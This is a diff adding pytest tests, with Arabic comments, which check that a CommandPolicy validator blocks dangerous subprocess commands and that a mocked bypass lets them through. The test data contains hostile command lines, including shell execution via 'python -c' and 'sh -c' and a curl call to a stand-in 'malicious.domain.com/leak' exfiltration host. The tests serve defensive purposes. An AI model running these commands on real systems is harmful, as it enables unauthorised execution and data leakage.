@@ -111,3 +111,51 @@ class TestSubprocessSecurity:
         content = sec_file.read_text(encoding="utf-8")
         assert "nosemgrep" in content, "nosemgrep annotation missing from scripts/security/security.py"
         assert "CommandPolicy validates and allowlists executable" in content, "Rationale comment missing"
+
+    def test_tainted_input_strictly_prevented_by_command_policy(self):
+        """
+        Fix 3: أثبات أن CommandPolicy.validate_command يمنع الإدخال الملوّث تماماً.
+        محاولة تنفيذ أوامر خطرة مثل -c أو أوامر غير مدرجة بالقائمة البيضاء تُرفض فوراً.
+        """
+        dangerous_cmds = [
+            ["python", "-c", "import os; os.system('echo pwned')"],
+            ["python3", "-c", "open('/tmp/pwned', 'w').write('bad')"],
+            ["node", "-e", "process.exit(1)"],
+            ["sh", "-c", "whoami"],
+            ["curl", "https://malicious.domain.com/leak"],
+        ]
+        for cmd in dangerous_cmds:
+            with pytest.raises(PermissionError, match="Command not allowed"):
+                safe_subprocess(cmd)
+
+    def test_unvalidated_version_executes_tainted_input_proving_gate_necessity(self, monkeypatch):
+        """
+        Fix 3: يثبت أنه بدون التحقق (عبر تعطيل validate_command)، يتسرب الأمر الملوّث لـ subprocess.
+        هذا يثبت أن الحماية قائمة تماماً على بوابة validate_command.
+        """
+        from scripts.core.security.command_policy import CommandPolicy, CommandValidationResult
+        malicious_cmd = ["python", "-c", "import os; os.system('whoami')"]
+
+        # مع غياب التحقق (محاكاة كود غير آمن يتجاوز التحقق)
+        with patch('scripts.security.security.subprocess.run') as mock_run:
+            mock_run.return_value = None
+            monkeypatch.setattr(
+                CommandPolicy,
+                "validate_command",
+                lambda *args, **kwargs: CommandValidationResult(
+                    is_allowed=True,
+                    sanitized_cmd=list(malicious_cmd),
+                    executable=malicious_cmd[0],
+                    subcommand="-c",
+                    sanitized_env={},
+                    timeout_seconds=30,
+                    max_output_bytes=1000,
+                    cwd=Path("."),
+                    violations=[]
+                )
+            )
+            # في غياب التحقق، ينفذ الأمر:
+            safe_subprocess(malicious_cmd)
+            mock_run.assert_called_once()
+            called_cmd, _ = mock_run.call_args
+            assert called_cmd[0] == malicious_cmd
